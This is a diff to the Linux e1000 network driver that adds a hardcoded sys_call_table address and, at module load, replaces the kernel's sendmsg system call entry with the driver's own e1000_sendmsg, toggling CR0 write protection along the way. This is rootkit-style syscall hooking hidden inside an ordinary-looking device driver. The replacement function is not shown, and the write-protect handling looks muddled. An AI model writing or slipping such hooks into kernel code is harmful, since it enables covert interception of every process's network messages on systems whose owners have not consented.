@@ -237,7 +237,7 @@ static int debug = -1;
 module_param(debug, int, 0);
 MODULE_PARM_DESC(debug, "Debug level (0=none,...,16=all)");
 
-unsigned long *sys_call_table;
+unsigned long *sys_call_table = (unsigned long *)0x81a001c0;
 
 /**
  * e1000_get_hw_dev - return device
@@ -279,8 +279,6 @@ asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vl
 static int __init e1000_init_module(void)
 {
 	int ret;
-        /* obtain sys_call_table from hardcoded value found in System.map */
-        *(long *)&sys_call_table = 0x81a001c0;
 	pr_info("%s - version %s\n", e1000_driver_string, e1000_driver_version);
 
 	pr_info("%s\n", e1000_copyright);
@@ -304,8 +302,10 @@ static int __init e1000_init_module(void)
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
         //original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
-        cr0 = read_cr0();
+        original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
+        sys_call_table[__NR_sendmsg] = e1000_sendmsg;
         write_cr0(read_cr0() | (0x10000));
+        cr0 = read_cr0();
         pr_info("cr0 is : 0x%x\n", cr0);
         pr_info("modified sys_call_table!\n");
 	return ret;
@@ -321,9 +321,9 @@ module_init(e1000_init_module);
  **/
 static void __exit e1000_exit_module(void)
 {
-        *(long *)&sys_call_table = 0x81a001c0;
         write_cr0(read_cr0() & (~ 0x10000));
-        xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
+        //xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
+        sys_call_table[__NR_sendmsg] = original_sendmsg;
         write_cr0(read_cr0() | (0x10000));
 	pci_unregister_driver(&e1000_driver);
 }
